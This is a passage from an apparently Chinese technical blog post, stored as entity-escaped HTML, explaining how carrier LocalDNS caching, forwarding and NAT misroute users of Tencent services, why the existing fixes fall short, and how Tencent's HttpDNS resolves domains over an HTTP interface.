title=\"1&#x3001;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#xFF1A;\"></a>1&#x3001;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#xFF1A;</h3><p>&#x57DF;&#x540D;&#x7F13;&#x5B58;&#x5F88;&#x597D;&#x7406;&#x89E3;&#xFF0C;&#x5C31;&#x662F;LocalDNS&#x7F13;&#x5B58;&#x4E86;&#x817E;&#x8BAF;&#x7684;&#x57DF;&#x540D;&#x7684;&#x89E3;&#x6790;&#x7ED3;&#x679C;&#xFF0C;&#x4E0D;&#x5411;&#x817E;&#x8BAF;&#x6743;&#x5A01;DNS&#x53D1;&#x8D77;&#x9012;&#x5F52;&#xFF0C;&#x793A;&#x610F;&#x56FE;&#x5982;&#x4E0B;&#xFF1A;  </p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%85%A8%E5%B1%80%E7%B2%BE%E7%A1%AE%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6%E6%96%B0%E6%80%9D%E8%B7%AF-HttpDNS%E6%9C%8D%E5%8A%A1%E8%AF%A6%E8%A7%A3/1.jpg\" alt=\"&#x56FE;&#x7247;1\">  </p>\n<p>&#x4E3A;&#x4F55;LocalDNS&#x8981;&#x628A;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x7F13;&#x5B58;&#x5462;&#xFF1F;&#x539F;&#x56E0;&#x6709;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#xFF1A;</p>\n<p>&#xFF08;1&#xFF09;&#x4FDD;&#x8BC1;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x6D41;&#x91CF;&#x5728;&#x672C;&#x7F51;&#x5185;&#x6D88;&#x5316;&#xFF1A;&#x56FD;&#x5185;&#x7684;&#x5404;&#x4E92;&#x8054;&#x7F51;&#x63A5;&#x5165;&#x8FD0;&#x8425;&#x5546;&#x7684;&#x5E26;&#x5BBD;&#x8D44;&#x6E90;&#x3001;&#x7F51;&#x95F4;&#x7ED3;&#x7B97;&#x8D39;&#x7528;&#x3001;IDC&#x673A;&#x623F;&#x5206;&#x5E03;&#x3001;&#x7F51;&#x5185;ICP&#x8D44;&#x6E90;&#x5206;&#x5E03;&#x7B49;&#x5B58;&#x5728;&#x8F83;&#x5927;&#x5DEE;&#x5F02;&#x3002;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x7F51;&#x5185;&#x7528;&#x6237;&#x7684;&#x8BBF;&#x95EE;&#x8D28;&#x91CF;&#xFF0C;&#x540C;&#x65F6;&#x51CF;&#x5C11;&#x8DE8;&#x7F51;&#x7ED3;&#x7B97;&#xFF0C;&#x8FD0;&#x8425;&#x5546;&#x5728;&#x7F51;&#x5185;&#x642D;&#x5EFA;&#x4E86;&#x5185;&#x5BB9;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x901A;&#x8FC7;&#x628A;&#x57DF;&#x540D;&#x5F3A;&#x884C;&#x6307;&#x5411;&#x5185;&#x5BB9;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x5C31;&#x5B9E;&#x73B0;&#x4E86;&#x628A;&#x672C;&#x5730;&#x672C;&#x7F51;&#x6D41;&#x91CF;&#x5B8C;&#x5168;&#x7559;&#x5728;&#x4E86;&#x672C;&#x5730;&#x7684;&#x76EE;&#x7684;&#x3002;</p>","more":"<p>&#xFF08;2&#xFF09;&#x63A8;&#x9001;&#x5E7F;&#x544A;&#xFF1A;&#x6709;&#x90E8;&#x5206;LocalDNS&#x4F1A;&#x628A;&#x90E8;&#x5206;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x7ED3;&#x679C;&#x7684;&#x6240;&#x6307;&#x5411;&#x7684;&#x5185;&#x5BB9;&#x7F13;&#x5B58;&#xFF0C;&#x5E76;&#x66FF;&#x6362;&#x6210;&#x7B2C;&#x4E09;&#x65B9;&#x5E7F;&#x544A;&#x8054;&#x76DF;&#x7684;&#x5E7F;&#x544A;&#x3002;</p>\n<p>&#x8FD9;&#x79CD;&#x7C7B;&#x578B;&#x7684;&#x884C;&#x4E3A;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x5E38;&#x8BF4;&#x7684;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#xFF0C;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#x4F1A;&#x5BFC;&#x81F4;&#x7528;&#x6237;&#x4EA7;&#x751F;&#x4EE5;&#x4E0B;&#x7684;&#x8BBF;&#x95EE;&#x5F02;&#x5E38;&#xFF1A;</p>\n<p>A&#x3001;&#x4EC5;&#x5BF9;80&#x7AEF;&#x53E3;&#x7684;http&#x670D;&#x52A1;&#x505A;&#x4E86;&#x7F13;&#x5B58;&#xFF0C;&#x5982;&#x679C;&#x57DF;&#x540D;&#x662F;&#x901A;&#x8FC7;https&#x534F;&#x8BAE;&#x6216;&#x5176;&#x5B83;&#x7AEF;&#x53E3;&#x63D0;&#x4F9B;&#x670D;&#x52A1;&#x7684;&#xFF0C;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x5C31;&#x4F1A;&#x51FA;&#x73B0;&#x5931;&#x8D25;&#x3002;&#x6BD4;&#x5982;&#x652F;&#x4ED8;&#x670D;&#x52A1;&#x3001;&#x6E38;&#x620F;&#x901A;&#x8FC7;&#x6307;&#x5B9A;&#x7AEF;&#x53E3;&#x8FDE;&#x63A5;connect server&#x670D;&#x52A1;&#x7B49;&#x3002;</p>\n<p>B&#x3001;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FD0;&#x7EF4;&#x6C34;&#x5E73;&#x53C2;&#x5DEE;&#x4E0D;&#x9F50;&#xFF0C;&#x65F6;&#x6709;&#x51FA;&#x73B0;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x6545;&#x969C;&#x5BFC;&#x81F4;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x5F02;&#x5E38;&#x7684;&#x95EE;&#x9898;&#x3002;</p>\n<h3 id=\"2&#x3001;&#x89E3;&#x6790;&#x8F6C;&#x53D1;&#xFF1A;\"><a href=\"#2&#x3001;&#x89E3;&#x6790;&#x8F6C;&#x53D1;&#xFF1A;\" class=\"headerlink\" title=\"2&#x3001;&#x89E3;&#x6790;&#x8F6C;&#x53D1;&#xFF1A;\"></a>2&#x3001;&#x89E3;&#x6790;&#x8F6C;&#x53D1;&#xFF1A;</h3><p>&#x9664;&#x4E86;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#x4EE5;&#x5916;&#xFF0C;&#x8FD0;&#x8425;&#x5546;&#x7684;LocalDNS&#x8FD8;&#x5B58;&#x5728;&#x89E3;&#x6790;&#x8F6C;&#x53D1;&#x7684;&#x73B0;&#x8C61;&#x3002;&#x89E3;&#x6790;&#x8F6C;&#x53D1;&#x662F;&#x6307;&#x8FD0;&#x8425;&#x5546;&#x81EA;&#x8EAB;&#x4E0D;&#x8FDB;&#x884C;&#x57DF;&#x540D;&#x9012;&#x5F52;&#x89E3;&#x6790;&#xFF0C;&#x800C;&#x662F;&#x628A;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x8BF7;&#x6C42;&#x8F6C;&#x53D1;&#x5230;&#x5176;&#x5B83;&#x8FD0;&#x8425;&#x5546;&#x7684;&#x9012;&#x5F52;DNS&#x4E0A;&#x7684;&#x884C;&#x4E3A;&#x3002;&#x6B63;&#x5E38;&#x7684;LocalDNS&#x9012;&#x5F52;&#x89E3;&#x6790;&#x8FC7;&#x7A0B;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%85%A8%E5%B1%80%E7%B2%BE%E7%A1%AE%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6%E6%96%B0%E6%80%9D%E8%B7%AF-HttpDNS%E6%9C%8D%E5%8A%A1%E8%AF%A6%E8%A7%A3/2.jpg\" alt=\"&#x56FE;&#x7247;2\">  </p>\n<p>&#x800C;&#x90E8;&#x5206;&#x5C0F;&#x8FD0;&#x8425;&#x5546;&#x4E3A;&#x4E86;&#x8282;&#x7701;&#x8D44;&#x6E90;&#xFF0C;&#x5C31;&#x76F4;&#x63A5;&#x5C06;&#x89E3;&#x6790;&#x8BF7;&#x6C42;&#x8F6C;&#x53D1;&#x5230;&#x4E86;&#x5176;&#x5B83;&#x8FD0;&#x8425;&#x7684;&#x9012;&#x5F52;LocalDNS&#x4E0A;&#x53BB;&#x4E86;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%85%A8%E5%B1%80%E7%B2%BE%E7%A1%AE%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6%E6%96%B0%E6%80%9D%E8%B7%AF-HttpDNS%E6%9C%8D%E5%8A%A1%E8%AF%A6%E8%A7%A3/3.jpg\" alt=\"&#x56FE;&#x7247;3\">  </p>\n<p>&#x8FD9;&#x6837;&#x7684;&#x76F4;&#x63A5;&#x540E;&#x679C;&#x5C31;&#x662F;&#x817E;&#x8BAF;&#x6743;&#x5A01;DNS&#x6536;&#x5230;&#x7684;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x8BF7;&#x6C42;&#x7684;&#x6765;&#x6E90;IP&#x5C31;&#x6210;&#x4E86;&#x5176;&#x5B83;&#x8FD0;&#x8425;&#x5546;&#x7684;IP&#xFF0C;&#x6700;&#x7EC8;&#x5BFC;&#x81F4;&#x7528;&#x6237;&#x6D41;&#x91CF;&#x88AB;&#x5BFC;&#x5411;&#x4E86;&#x9519;&#x8BEF;&#x7684;IDC&#xFF0C;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x53D8;&#x6162;&#x3002;</p>\n<h3 id=\"3&#x3001;LocalDNS&#x9012;&#x5F52;&#x51FA;&#x53E3;NAT&#xFF1A;\"><a href=\"#3&#x3001;LocalDNS&#x9012;&#x5F52;&#x51FA;&#x53E3;NAT&#xFF1A;\" class=\"headerlink\" title=\"3&#x3001;LocalDNS&#x9012;&#x5F52;&#x51FA;&#x53E3;NAT&#xFF1A;\"></a>3&#x3001;LocalDNS&#x9012;&#x5F52;&#x51FA;&#x53E3;NAT&#xFF1A;</h3><p>LocalDNS&#x9012;&#x5F52;&#x51FA;&#x53E3;NAT&#x6307;&#x7684;&#x662F;&#x8FD0;&#x8425;&#x5546;&#x7684;LocalDNS&#x6309;&#x7167;&#x6807;&#x51C6;&#x7684;DNS&#x534F;&#x8BAE;&#x8FDB;&#x884C;&#x9012;&#x5F52;&#xFF0C;&#x4F46;&#x662F;&#x56E0;&#x4E3A;&#x5728;&#x7F51;&#x7EDC;&#x4E0A;&#x5B58;&#x5728;&#x591A;&#x51FA;&#x53E3;&#x4E14;&#x914D;&#x7F6E;&#x4E86;&#x76EE;&#x6807;&#x8DEF;&#x7531;NAT&#xFF0C;&#x7ED3;&#x679C;&#x5BFC;&#x81F4;LocalDNS&#x6700;&#x7EC8;&#x8FDB;&#x884C;&#x9012;&#x5F52;&#x89E3;&#x6790;&#x7684;&#x65F6;&#x5019;&#x7684;&#x51FA;&#x53E3;IP&#x5C31;&#x6709;&#x6982;&#x7387;&#x4E0D;&#x4E3A;&#x672C;&#x7F51;&#x7684;IP&#x5730;&#x5740;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%85%A8%E5%B1%80%E7%B2%BE%E7%A1%AE%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6%E6%96%B0%E6%80%9D%E8%B7%AF-HttpDNS%E6%9C%8D%E5%8A%A1%E8%AF%A6%E8%A7%A3/4.jpg\" alt=\"&#x56FE;&#x7247;4\">  </p>\n<p>&#x8FD9;&#x6837;&#x7684;&#x76F4;&#x63A5;&#x540E;&#x679C;&#x5C31;&#x662F;GSLB DNS&#x6536;&#x5230;&#x7684;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x8BF7;&#x6C42;&#x7684;&#x6765;&#x6E90;IP&#x8FD8;&#x662F;&#x6210;&#x4E86;&#x5176;&#x5B83;&#x8FD0;&#x8425;&#x5546;&#x7684;IP&#xFF0C;&#x6700;&#x7EC8;&#x5BFC;&#x81F4;&#x7528;&#x6237;&#x6D41;&#x91CF;&#x88AB;&#x5BFC;&#x5411;&#x4E86;&#x9519;&#x8BEF;&#x7684;IDC&#xFF0C;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x53D8;&#x6162;&#x3002;</p>\n<h2 id=\"&#x4E8C;&#x3001;&#x73B0;&#x6709;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x53CA;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;&#xFF1A;\"><a href=\"#&#x4E8C;&#x3001;&#x73B0;&#x6709;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x53CA;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;&#xFF1A;\" class=\"headerlink\" title=\"&#x4E8C;&#x3001;&#x73B0;&#x6709;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x53CA;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;&#xFF1A;\"></a>&#x4E8C;&#x3001;&#x73B0;&#x6709;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x53CA;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;&#xFF1A;</h2><p>&#x8FD0;&#x8425;&#x5546;&#x7684;LocalDNS&#x89E3;&#x6790;&#x57DF;&#x540D;&#x5F02;&#x5E38;&#xFF0C;&#x7ED9;&#x5BF9;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x817E;&#x8BAF;&#x4E1A;&#x52A1;&#x7684;&#x4F53;&#x9A8C;&#x9020;&#x6210;&#x4E86;&#x975E;&#x5E38;&#x5927;&#x7684;&#x635F;&#x5BB3;&#x3002;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x662F;&#x5982;&#x4F55;&#x5904;&#x7406;&#x8FD9;&#x4E9B;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x7684;&#x95EE;&#x9898;&#x7684;&#x5462;&#xFF1F;</p>\n<h3 id=\"1&#x3001;&#x5B9E;&#x65F6;&#x76D1;&#x63A7;-&#x5546;&#x52A1;&#x63A8;&#x52A8;&#xFF1A;\"><a href=\"#1&#x3001;&#x5B9E;&#x65F6;&#x76D1;&#x63A7;-&#x5546;&#x52A1;&#x63A8;&#x52A8;&#xFF1A;\" class=\"headerlink\" title=\"1&#x3001;&#x5B9E;&#x65F6;&#x76D1;&#x63A7;+&#x5546;&#x52A1;&#x63A8;&#x52A8;&#xFF1A;\"></a>1&#x3001;&#x5B9E;&#x65F6;&#x76D1;&#x63A7;+&#x5546;&#x52A1;&#x63A8;&#x52A8;&#xFF1A;</h3><p>&#x8FD9;&#x79CD;&#x65B9;&#x6848;&#x662F;&#x76EE;&#x524D;&#x817E;&#x8BAF;&#x7684;&#x8FD0;&#x8425;&#x56E2;&#x961F;&#x4E00;&#x76F4;&#x5728;&#x4F7F;&#x7528;&#x7684;&#x65B9;&#x6848;&#x3002;&#x8FD9;&#x79CD;&#x65B9;&#x6848;&#x5C31;&#x662F;&#x5468;&#x671F;&#x6BD4;&#x8F83;&#x957F;&#xFF0C;&#x6BD5;&#x7ADF;&#x901A;&#x8FC7;&#x884C;&#x653F;&#x624B;&#x6BB5;&#x6765;&#x63A8;&#x52A8;&#x8FD0;&#x8425;&#x5546;&#x6765;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x662F;&#x6BD4;&#x8F83;&#x8017;&#x65F6;&#x7684;&#x3002;&#x53E6;&#x5916;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x5927;&#x6570;&#x636E;&#x5206;&#x6790;&#xFF0C;&#x5F97;&#x51FA;&#x7684;&#x7ED3;&#x8BBA;&#x662F;Top 3&#x7684;&#x95EE;&#x9898;&#x7528;&#x6237;&#x5747;&#x4E3A;&#x79FB;&#x52A8;&#x4E92;&#x8054;&#x7F51;&#x7528;&#x6237;&#x3002;&#x5BF9;&#x4E8E;&#x8FD9;&#x90E8;&#x5206;&#x7528;&#x6237;&#xFF0C;&#x6211;&#x4EEC;&#x6709;&#x4EC0;&#x4E48;&#x6280;&#x672F;&#x624B;&#x6BB5;&#x53EF;&#x4EE5;&#x89E3;&#x51B3;&#x4EE5;&#x4E0A;&#x7684;&#x95EE;&#x9898;&#x5462;&#xFF1F;</p>\n<h3 id=\"2&#x3001;&#x7ED5;&#x8FC7;&#x81EA;&#x52A8;&#x5206;&#x914D;DNS&#xFF0C;&#x4F7F;&#x7528;114dns&#x6216;Google-public-DNS&#xFF1A;\"><a href=\"#2&#x3001;&#x7ED5;&#x8FC7;&#x81EA;&#x52A8;&#x5206;&#x914D;DNS&#xFF0C;&#x4F7F;&#x7528;114dns&#x6216;Google-public-DNS&#xFF1A;\" class=\"headerlink\" title=\"2&#x3001;&#x7ED5;&#x8FC7;&#x81EA;&#x52A8;&#x5206;&#x914D;DNS&#xFF0C;&#x4F7F;&#x7528;114dns&#x6216;Google public DNS&#xFF1A;\"></a>2&#x3001;&#x7ED5;&#x8FC7;&#x81EA;&#x52A8;&#x5206;&#x914D;DNS&#xFF0C;&#x4F7F;&#x7528;114dns&#x6216;Google public DNS&#xFF1A;</h3><p>&#x8FD9;&#x4E2A;&#x65B9;&#x6848;&#x770B;&#x4E0A;&#x53BB;&#x5F88;&#x7F8E;&#x597D;&#xFF0C;114dns&#x662F;&#x56FD;&#x5185;&#x6700;&#x5927;&#x7684;&#x4E2D;&#x7ACB;&#x7F13;&#x5B58;DNS&#xFF0C;&#x800C;Google&#x53C8;&#x662F;&#x79C9;&#x627F;&#x4E0D;&#x4F5C;&#x6076;&#x7406;&#x5FF5;&#x7684;&#x4E92;&#x8054;&#x7F51;&#x5DE5;&#x7A0B;&#x5E1D;&#x56FD;&#x5DE8;&#x9CC4;&#xFF0C;&#x800C;&#x4E14;&#x817E;&#x8BAF;&#x7684;&#x6743;&#x5A01;DNS&#x53C8;&#x652F;&#x6301;edns-client-subnet&#x529F;&#x80FD;&#xFF0C;&#x80FD;&#x76F4;&#x63A5;&#x8BC6;&#x522B;&#x4F7F;&#x7528;Google publicDNS&#x89E3;&#x6790;&#x817E;&#x8BAF;&#x57DF;&#x540D;&#x7684;&#x7528;&#x6237;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x5931;&#x6548;&#x3002;&#x4F46;&#x662F;&#x95EE;&#x9898;&#x6765;&#x4E86;&#xFF1A;</p>\n<p>&#xFF08;1&#xFF09;&#x5982;&#x4F55;&#x5728;&#x7528;&#x6237;&#x4FA7;&#x6784;&#x9020;&#x57DF;&#x540D;&#x8BF7;&#x6C42;&#xFF1A;&#x5BF9;&#x4E8E;PC&#x7AEF;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x6765;&#x8BF4;&#xFF0C;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x6807;&#x51C6;&#x7684;DNS&#x8BF7;&#x6C42;&#x5305;&#x5E76;&#x4E0D;&#x7B97;&#x4EC0;&#x4E48;&#x96BE;&#x4E8B;&#x3002;&#x4F46;&#x5728;&#x79FB;&#x52A8;&#x7AEF;&#x8981;&#x5411;&#x4E00;&#x4E2A;&#x6307;&#x5B9A;&#x7684;LocalDNS&#x4E0A;&#x53D1;&#x9001;&#x6807;&#x51C6;&#x7684;DNS&#x8BF7;&#x6C42;&#x5305;&#xFF0C;&#x800C;&#x4E14;&#x8981;&#x517C;&#x5BB9;&#x5404;&#x79CD;iOS&#x548C;Android&#x7684;&#x7248;&#x672C;&#x7684;&#x8BDD;&#xFF0C;&#x6280;&#x672F;&#x4E0A;&#x662F;&#x53EF;&#x884C;&#x7684;&#xFF0C;&#x53EA;&#x662F;&#x517C;&#x5BB9;&#x7684;&#x6210;&#x672C;&#x4F1A;&#x5F88;&#x9AD8;&#x3002;</p>\n<p>&#xFF08;2&#xFF09;&#x63A8;&#x52A8;&#x7528;&#x6237;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6781;&#x9AD8;&#xFF1A;&#x5982;&#x679C;&#x8981;&#x63A8;&#x52A8;&#x7528;&#x6237;&#x624B;&#x52A8;&#x4FEE;&#x6539;PC&#x7684;DNS&#x914D;&#x7F6E;&#x7684;&#x8BDD;&#xFF0C;&#x5728;PC&#x7AEF;&#x548C;&#x624B;&#x673A;&#x5BA2;&#x6237;&#x7AEF;&#x7684;WiFI&#x4E0B;&#x9762;&#x8FD8;&#x7B97;&#x52C9;&#x5F3A;&#x53EF;&#x884C;&#x3002;&#x4F46;&#x662F;&#x8981;&#x7528;&#x6237;&#x4FEE;&#x6539;&#x5728;&#x79FB;&#x52A8;&#x4E92;&#x8054;&#x7F51;&#x73AF;&#x5883;&#x4E0B;&#x7684;DNS&#x914D;&#x7F6E;&#xFF0C;&#x5176;&#x96BE;&#x5EA6;&#x4E0D;&#x8A00;&#x800C;&#x55BB;&#x3002;</p>\n<h3 id=\"3&#x3001;&#x5B8C;&#x5168;&#x629B;&#x5F03;&#x57DF;&#x540D;&#xFF0C;&#x81EA;&#x5EFA;connectcenter&#x8FDB;&#x884C;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#xFF1A;\"><a href=\"#3&#x3001;&#x5B8C;&#x5168;&#x629B;&#x5F03;&#x57DF;&#x540D;&#xFF0C;&#x81EA;&#x5EFA;connectcenter&#x8FDB;&#x884C;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#xFF1A;\" class=\"headerlink\" title=\"3&#x3001;&#x5B8C;&#x5168;&#x629B;&#x5F03;&#x57DF;&#x540D;&#xFF0C;&#x81EA;&#x5EFA;connectcenter&#x8FDB;&#x884C;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#xFF1A;\"></a>3&#x3001;&#x5B8C;&#x5168;&#x629B;&#x5F03;&#x57DF;&#x540D;&#xFF0C;&#x81EA;&#x5EFA;connectcenter&#x8FDB;&#x884C;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#xFF1A;</h3><p>&#x5982;&#x679C;&#x8981;&#x91C7;&#x7528;&#x8FD9;&#x79CD;&#x8FD9;&#x79CD;&#x65B9;&#x6848;&#x7684;&#x8BDD;&#xFF0C;&#x9996;&#x5148;&#x4F60;&#x5C31;&#x5F97;&#x8981;&#x62FF;&#x5230;&#x4E00;&#x4EFD;&#x51C6;&#x786E;&#x7684;IP&#x5730;&#x5740;&#x5E93;&#x6765;&#x5224;&#x65AD;&#x7528;&#x6237;&#x7684;&#x5F52;&#x5C5E;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x5236;&#x5B9A;&#x4E2A;&#x534F;&#x8BAE;&#x642D;&#x4E2A;connect center&#x6765;&#x505A;&#x8C03;&#x5EA6;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x5BF9;&#x63A5;&#x5165;&#x5C42;&#x505A;&#x8C03;&#x5EA6;&#x6539;&#x9020;&#x3002;&#x8FD9;&#x79CD;&#x65B9;&#x6848;&#x548C;2&#x79CD;&#x65B9;&#x6848;&#x4E00;&#x6837;&#xFF0C;&#x4E0D;&#x662F;&#x4E0D;&#x80FD;&#x505A;&#xFF0C;&#x53EA;&#x662F;&#x6210;&#x672C;&#x4F1A;&#x6BD4;&#x8F83;&#x9AD8;&#xFF0C;&#x5C24;&#x5176;&#x5BF9;&#x4E8E;&#x817E;&#x8BAF;&#x8FD9;&#x79CD;&#x4E1A;&#x52A1;&#x89C4;&#x6A21;&#x5982;&#x6B64;&#x5E9E;&#x5927;&#x7684;&#x516C;&#x53F8;&#x800C;&#x8A00;&#x3002;</p>\n<h2 id=\"&#x4E09;&#x3001;&#x5229;&#x7528;HttpDNS&#x89E3;&#x51B3;&#x7528;&#x6237;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#xFF1A;\"><a href=\"#&#x4E09;&#x3001;&#x5229;&#x7528;HttpDNS&#x89E3;&#x51B3;&#x7528;&#x6237;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#xFF1A;\" class=\"headerlink\" title=\"&#x4E09;&#x3001;&#x5229;&#x7528;HttpDNS&#x89E3;&#x51B3;&#x7528;&#x6237;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#xFF1A;\"></a>&#x4E09;&#x3001;&#x5229;&#x7528;HttpDNS&#x89E3;&#x51B3;&#x7528;&#x6237;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#xFF1A;</h2><p>&#x65E2;&#x7136;&#x4E0A;&#x9762;&#x7684;&#x65B9;&#x6848;&#x90FD;&#x5B58;&#x5728;&#x90A3;&#x4E48;&#x591A;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x90A3;&#x6709;&#x6CA1;&#x6709;&#x4E00;&#x79CD;&#x8C03;&#x5EA6;&#x7CBE;&#x51C6;&#x3001;&#x6210;&#x672C;&#x4F4E;&#x5EC9;&#x3001;&#x914D;&#x7F6E;&#x65B9;&#x4FBF;&#x7684;&#x57FA;&#x4E8E;&#x57DF;&#x540D;&#x7684;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x7CFB;&#x7EDF;&#x5462;&#xFF1F;&#x7B54;&#x6848;&#x662F;&#x80AF;&#x5B9A;&#x7684;&#x3002;&#x817E;&#x8BAF;&#x516C;&#x53F8;&#x7684;GSLB &#x56E2;&#x961F;&#x63A8;&#x51FA;&#x4E86;&#x4E00;&#x79CD;&#x5168;&#x65B0;&#x7684;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x8C03;&#x5EA6;&#x7CFB;&#x7EDF;&#xFF1A;HttpDNS&#x3002;HttpDNS&#x662F;&#x4E3A;&#x79FB;&#x52A8;&#x5BA2;&#x6237;&#x7AEF;&#x91CF;&#x8EAB;&#x5B9A;&#x505A;&#x7684;&#x57FA;&#x4E8E;Http&#x534F;&#x8BAE;&#x548C;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x7684;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x4E13;&#x6CBB;LocalDNS&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x4EE5;&#x53CA;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x4E0D;&#x51C6;&#x3002;&#x8BE6;&#x7EC6;&#x4ECB;&#x7ECD;&#x5982;&#x4E0B;&#xFF1A;</p>\n<h3 id=\"1&#x3001;HttpDNS&#x57FA;&#x672C;&#x539F;&#x7406;&#xFF1A;\"><a href=\"#1&#x3001;HttpDNS&#x57FA;&#x672C;&#x539F;&#x7406;&#xFF1A;\" class=\"headerlink\" title=\"1&#x3001;HttpDNS&#x57FA;&#x672C;&#x539F;&#x7406;&#xFF1A;\"></a>1&#x3001;HttpDNS&#x57FA;&#x672C;&#x539F;&#x7406;&#xFF1A;</h3><p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%85%A8%E5%B1%80%E7%B2%BE%E7%A1%AE%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6%E6%96%B0%E6%80%9D%E8%B7%AF-HttpDNS%E6%9C%8D%E5%8A%A1%E8%AF%A6%E8%A7%A3/5.jpg\" alt=\"&#x56FE;&#x7247;5\">  </p>\n<p>HttpDNS&#x7684;&#x539F;&#x7406;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x4E3B;&#x8981;&#x6709;&#x4E24;&#x6B65;&#xFF1A;</p>\n<p>A&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;HttpDNS&#x63A5;&#x53E3;&#xFF0C;&#x83B7;&#x53D6;&#x4E1A;&#x52A1;&#x5728;&#x57DF;&#x540D;&#x914D;&#x7F6E;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E0A;&#x914D;&#x7F6E;&#x7684;&#x8BBF;&#x95EE;&#x5EF6;&#x8FDF;&#x6700;&#x4F18;&#x7684;IP&#x3002;&#xFF08;&#x57FA;&#x4E8E;&#x5BB9;&#x707E;&#x8003;&#x8651;&#xFF0C;&#x8FD8;&#x662F;&#x4FDD;&#x7559;&#x6B21;&#x9009;&#x4F7F;&#x7528;&#x8FD0;&#x8425;&#x5546;LocalDNS&#x89E3;&#x6790;&#x57DF;&#x540D;&#x7684;&#x65B9;&#x5F0F;&#xFF09;</p>\n<p>B&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x5411;&#x83B7;&#x53D6;&#x5230;&#x7684;IP&#x540E;&#x5C31;&#x5411;&#x76F4;&#x63A5;&#x5F80;&#x6B64;IP&#x53D1;&#x9001;&#x4E1A;&#x52A1;&#x534F;&#x8BAE;&#x8BF7;&#x6C42;&#x3002;&#x4EE5;Http&#x8BF7;&#x6C42;&#x4E3A;&#x4F8B;&#xFF0C;&#x901A;&#x8FC7;&#x5728;header&#x4E2D;&#x6307;&#x5B9A;host&#x5B57;&#x6BB5;&#xFF0C;&#x5411;HttpDNS&#x8FD4;&#x56DE;&#x7684;IP&#x53D1;&#x9001;&#x6807;&#x51C6;&#x7684;Http&#x8BF7;&#x6C42;&#x5373;&#x53EF;&#x3002;</p>\n<h3 id=\"2&#x3001;HttpDNS&#x4F18;&#x52BF;&#xFF1A;\"><a 